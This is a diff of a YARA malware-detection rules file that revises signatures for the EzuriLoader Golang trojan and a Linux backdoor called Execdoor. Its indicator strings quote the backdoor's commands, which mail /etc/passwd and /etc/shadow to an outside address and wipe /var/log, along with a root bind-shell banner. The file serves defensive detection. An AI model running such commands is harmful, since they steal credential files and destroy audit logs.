@@ -95,7 +95,8 @@ rule EzuriLoader_Golang_Generic
   meta:
     author = "Nong Hoang Tu"
     email = "dmknght@parrotsec.org"
-    description = "Linux Trojan written in Golang. https://www.virustotal.com/gui/file/751014e0154d219dea8c2e999714c32fd98f817782588cd7af355d2488eb1c80"
+    description = "Detect file by section hash for EzuriLoader's Golang binaries"
+    reference = "https://www.virustotal.com/gui/file/751014e0154d219dea8c2e999714c32fd98f817782588cd7af355d2488eb1c80"
     hash = "751014e0154d219dea8c2e999714c32fd98f817782588cd7af355d2488eb1c80"
   condition:
     is_elf and hash.md5(elf.sections[3].offset, elf.sections[3].size) == "dfd54f22d3a3bb072d34c424aa554500"
@@ -122,22 +123,27 @@ rule Metasploit_Staged_Generic {
 }
 
 
-rule Execdoor {
+rule Excedoor_Generic {
   meta:
     author = "Nong Hoang Tu"
     email = "dmknght@parrotsec.org"
-    description = "Linux Execdoor"
-    date = "12/11/2021"
+    description = "Linux Excedoor"
+    date = "28/12/2021"
     refrence = "https://otx.alienvault.com/indicator/file/6138054a7de11c23b5c26755d7548c4096fa547cbb964ac78ef0fbe59d16c2da"
-    target = "File, memory"
+    hash = "3d06f85ac19dc1a6f678aa4e28ce5c42"
+    file_type = "ELF32"
   strings:
-    $s1 = "rm -rf /var/log/*"
-    $s2 = "/bin/sh"
-    $s3 = "mail -s passwdforyababe gayz0r@boi.org.ie < /etc/passwd"
-    $s4 = "mail -s shadowforyababe gayz0r@boi.org.ie < /etc/shadow"
-    $s5 = "Brand new TCP root shell!"
+    $s_1 = { 70 61 73 73 77 64 66 6F 72 79 61 62 61 62 65 } // "passwdforyababe"
+    $s_2 = { 73 68 61 64 6F 77 66 6F 72 79 61 62 61 62 65 } // "shadowforyababe"
+    $s_3 = { 67 61 79 7A 30 72 40 62 6F 69 2E 6F 72 67 2E 69 65 } // "gayz0r@boi.org.ie"
+    $s_4 = { 42 72 61 6E 64 20 6E 65 77 20 54 43 50 20 72 6F 6F 74 20 73 68 65 6C 6C 21 } // "Brand new TCP root shell!"
   condition:
-    $s3 or $s4 or ($s1 and $s2 and $s5)
+    (is_elf and for any i in (0 .. elf.symtab_entries - 1): ( // Detect file by function name / obj names
+      (elf.symtab[i].type == elf.STT_OBJECT and (elf.symtab[i].name == "mailpasswd" or elf.symtab[i].name == "mailshadow")) or
+      (elf.symtab[i].type == elf.STT_FUNC and elf.symtab[i].name == "bindshell")
+    )) or
+    ($s_1 and $s_2 and $s_3) or // Detect strings in memory / file
+    $s_4 // Heuristic level
 }
 
 rule EkoBackdoor {
